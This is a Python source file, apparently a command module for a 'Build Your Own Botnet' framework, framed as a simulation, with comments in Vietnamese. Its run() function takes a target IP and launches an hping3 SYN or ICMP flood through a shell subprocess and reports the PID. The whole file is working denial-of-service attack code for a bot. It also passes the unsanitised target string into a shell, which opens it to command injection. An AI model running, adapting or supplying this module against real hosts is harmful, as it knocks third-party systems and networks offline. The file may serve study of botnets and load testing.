#!/usr/bin/python
# -*- coding: utf-8 -*-
'DDoS Attack Module (Build Your Own Botnet Simulation)'

# standard library
import subprocess

# globals
command = True
packages = []
platforms = ['win32','linux2','darwin']
usage = 'ddos [target_ip] [type=syn/icmp]'
description = """
Thực hiện tấn công từ chối dịch vụ phân tán (DDoS) sử dụng kỹ thuật 
ICMP Flood hoặc SYN Flood để kiểm tra khả năng chịu tải của hệ thống [4, 5].
"""

# main
def run(action=""):
    """
    Khởi chạy đợt tấn công DDoS dựa trên các thông số thực nghiệm [5].
    
    Args:
        action: Chuỗi chứa "<target_ip> <type>" (ví dụ: "192.168.1.100 syn")
                Nếu action trống, sử dụng giá trị mặc định.
    
    Returns:
        Chuỗi kết quả thực thi lệnh.
    """
    try:
        # Phân tích tham số từ action string
        parts = action.strip().split() if action else []
        
        if len(parts) >= 2:
            target = parts[0]
            attack_type = parts[1]
        elif len(parts) == 1:
            target = parts[0]
            attack_type = "syn"  # Mặc định là SYN nếu không chỉ định
        else:
            target = "10.0.0.20"
            attack_type = "syn"
        
        # Xây dựng lệnh dựa trên loại tấn công
        if attack_type.lower() == "syn":
            # SYN Flood: Sử dụng gói tin TCP SYN, kích thước 100,000 bytes, Window size 64 [5].
            # Mục tiêu: Làm cạn kiệt tài nguyên CPU của nạn nhân (có thể lên tới 90%) [6, 7].
            cmd = "hping3 -S {} -p 80 --flood -d 100000 -w 64".format(target)
            
        elif attack_type.lower() == "icmp":
            # ICMP Flood: Gửi gói tin ICMP liên tục với kích thước phần thân 1500 bytes [5].
            # Mục tiêu: Làm tràn băng thông mạng của mục tiêu [5, 8].
            cmd = "hping3 -1 --flood -d 1500 {}".format(target)
            
        else:
            return "Loại tấn công không hợp lệ. Sử dụng 'syn' hoặc 'icmp'. Received: {}".format(attack_type)

        # Thực thi lệnh thông qua subprocess để không làm treo luồng chính của bot [9].
        # Lưu ý: Cần quyền sudo/root trên host để chạy hping3 [3, 10].
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        return "Đã khởi động tấn công {} flood vào mục tiêu {} (PID: {}) [11, 12].".format(
            attack_type.upper(), target, process.pid)

    except Exception as e:
        return "{} error: {}".format(run.__name__, str(e))